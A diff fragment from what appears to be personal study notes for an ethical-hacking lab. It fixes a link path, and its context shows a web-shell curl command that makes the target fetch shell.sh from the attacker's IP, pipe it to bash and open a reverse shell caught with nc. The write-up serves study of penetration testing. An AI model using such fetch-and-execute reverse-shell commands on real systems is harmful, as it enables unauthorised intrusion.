@@ -87,7 +87,7 @@ or with the terminal
 curl -G "http://thetoppers.htb/shell.php" \ --data-urlencode "cmd=curl http://YOUR_TUN0_IP:8000/shell.sh | bash"
 ```
 This tells the target to: download shell.sh from your machine → pipe it to bash → execute it.curl -G "http://thetoppers.htb/shell.php" \ --data-urlencode "cmd=curl http://YOUR_TUN0_IP:8000/shell.sh | bash"
-See [[Obsidian-University/University/Magistrale/Ethical Hacking/For Passion/Reverse Shells#What that full url means|here]] for details
+See [[Obsidian-University/University/Magistrale/Ethical Hacking/For Passion/Hacking Linux/Reverse Shells#What that full url means|here]] for details
 ### 6. You receive the shell
 
 Your `nc` terminal will show:
